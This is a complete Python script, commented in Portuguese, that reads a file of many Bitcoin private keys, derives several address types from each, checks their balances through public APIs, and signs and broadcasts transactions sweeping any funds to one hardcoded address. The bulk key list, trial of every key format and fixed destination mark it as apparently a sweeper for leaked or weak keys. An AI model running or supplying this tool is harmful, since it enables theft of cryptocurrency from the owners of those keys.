import requests
import time
import sys
import os
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction

# --- CONFIGURAÇÕES ---
DEST_ADDRESS = 'bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk'
CONSOLIDATED_KEYS_FILE = 'consolidated_keys.txt'

def check_balance_api(address):
    """Consulta saldo em múltiplas APIs"""
    apis = [
        f"https://mempool.space/api/address/{address}",
        f"https://blockstream.info/api/address/{address}"
    ]
    for api_url in apis:
        try:
            r = requests.get(api_url, timeout=10)
            if r.status_code == 200:
                data = r.json()
                stats = data.get('chain_stats', {})
                return stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
        except: continue
    return 0

def broadcast_transaction(raw_hex):
    """Realiza o broadcast da transação para múltiplas APIs"""
    print(f"⚡ Iniciando broadcast da transação...")
    
    # 1. Blockchain.com
    try:
        resp = requests.post("https://api.blockchain.info/pushtx", data={"tx": raw_hex}, timeout=15)
        print(f"Blockchain.com: {resp.text}")
    except Exception as e:
        print(f"Erro Blockchain.com: {e}")

    # 2. ViaBTC
    try:
        resp = requests.post("https://www.viabtc.com/res/tools/v1/broadcast", data={"raw_tx": raw_hex}, timeout=15)
        print(f"ViaBTC: {resp.text}")
    except Exception as e:
        print(f"Erro ViaBTC: {e}")

    # 3. Blockstream (Fallback)
    try:
        resp = requests.post("https://blockstream.info/api/tx", data=raw_hex, timeout=15)
        print(f"Blockstream: {resp.text}")
    except Exception as e:
        print(f"Erro Blockstream: {e}")

def create_and_send_tx(addr, wif, utxos_val):
    """Cria, assina e transmite a transação"""
    try:
        r = requests.get(f"https://mempool.space/api/address/{addr}/utxo", timeout=15)
        if r.status_code != 200: return
        utxos = r.json()
        if not utxos: return

        tx = Transaction(network='bitcoin')
        fee = 35000 # Taxa para prioridade máxima
        amount = utxos_val - fee
        
        if amount > 1000:
            for u in utxos:
                tx.add_input(prev_txid=u['txid'], output_n=u['vout'], value=u['value'], address=addr)
            tx.add_output(value=amount, address=DEST_ADDRESS)
            tx.sign([wif])
            
            raw_hex = tx.raw_hex()
            print(f"✅ Transação Gerada para {addr} | HEX: {raw_hex[:20]}...")
            broadcast_transaction(raw_hex)
        else:
            print(f"⚠️ Saldo insuficiente para taxa em {addr}")
    except Exception as e:
        print(f"💥 Erro ao processar {addr}: {e}")

def run_fdr_system():
    print("🚀 INICIANDO SISTEMA UNIFICADO FDR - CAISK")
    
    if not os.path.exists(CONSOLIDATED_KEYS_FILE):
        print("❌ Arquivo de chaves consolidadas não encontrado!")
        return

    with open(CONSOLIDATED_KEYS_FILE, 'r') as f:
        keys = [line.strip() for line in f if line.strip()]

    print(f"🔑 Carregadas {len(keys)} chaves para processamento.")
    
    for i, key_item in enumerate(keys):
        if i % 100 == 0:
            print(f"⏳ Processando chave {i}/{len(keys)}...")
            sys.stdout.flush()

        # Testa formatos Comprimido e Não-Comprimido
        for is_comp in [True, False]:
            try:
                k = Key(key_item, network='bitcoin', compressed=is_comp)
                
                # Testa derivações: Legacy, SegWit P2SH, Native SegWit
                for addr_gen in [k.address(), k.address(witness_type='p2sh-p2wpkh'), k.address(witness_type='p2wpkh')]:
                    balance = check_balance_api(addr_gen)
                    if balance > 0:
                        print(f"💰 SALDO DETECTADO! {addr_gen} | {balance} sats")
                        create_and_send_tx(addr_gen, k.wif(), balance)
            except: continue
        
        # Pequeno delay para respeitar limites de API
        time.sleep(0.05)

if __name__ == "__main__":
    run_fdr_system()
